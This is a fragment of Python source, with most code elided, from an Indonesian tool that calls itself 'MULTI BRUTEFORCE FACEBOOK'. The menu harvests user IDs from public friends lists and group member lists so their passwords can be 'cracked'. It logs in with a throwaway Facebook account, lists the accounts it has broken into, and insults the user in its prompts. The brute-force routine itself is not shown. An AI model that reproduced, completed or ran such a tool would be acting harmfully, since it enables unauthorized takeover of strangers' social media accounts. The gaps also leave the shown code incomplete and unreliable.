...
def tampilhasil(akun,sandi,data):
	...
	i = inputD('[?] Mau Crack lagi gak nyet (y/t)',['Y','T'])
	if i.upper() == 'Y':
		return crack(data)
	else:
		return menu()
	...
	while 1:
		...
		if v:
			if a.upper() in v:
				...
				cetak('!m[!] Masukan Opsinya anjing...')
				continue
		else:
			if len(a) == 0:
...
def login():
	...
	cetak('!h[*] Sedang Login tunggu bentar nyet....')
	...
	if 'save-device' in url or 'm_sess' in url:
		...
		cetak('!h[*] Semoga ini adalah hari keberuntungan mu ya nyet...')
		log = 1
	elif 'checkpoint' in url:
		cetak('!m[!] Akun kena checkpoint\n!k[!]Coba Login dengan crome')
		keluar()
	else:
		cetak('!m[!] Login Gagal')
def idgroup():
	if log != 1:
		cetak('!h[*] Login !bFB!h dulu nyet...')
		login()
		if log == 0:
			keluar()
...
def idteman():
	if log != 1:
		cetak('!h[*] Login !bFB !hdulu nyet | akun tumbal...')
		login()
		if log == 0:
			keluar()
	...
	if i.upper() == 'Y':
		...
		return menu()
def menu():
	cetak("\n           !h.-.-..\n          /+/++//\n         /+/++//\n  !k*   !k* !h/+/++//\n   \ /  |/__//\n !h{!mX!h}v{!mX!h}!0!b|!cMBF!b|==========.\n   !h(!m'!h)!0  !h/'|'\           !b\\\n       !h/  \  \          !b'\n       !h\_  \_ \_   !k___!mMBF !c2.0!k___\n\n !m* !bMULTI BRUTEFORCE FACEBOOK\n !m* !cAUTHOR : YOSHI TECH\n !m* !pGITHUB : https://github.com/Zuck-Ker\n !m* !pFACEBOOK : YOSHI\n !m* !TEAM : FX TECH TEAM\n!k.======================.\n|!h  ambil !mid!h dari.....  !k|\n'======================'\n!k[!p1] !hCrack dari daftar teman (publik)\n!k[!p2] !hCrack dari daftar anggota grup (publik)\n!k#!p3 !mkeluar..")
	i = inputM('[?] pilihan',[1,2,3])
	if i == 2:
		lanjutG()
		idgroup()
	elif i == 1:
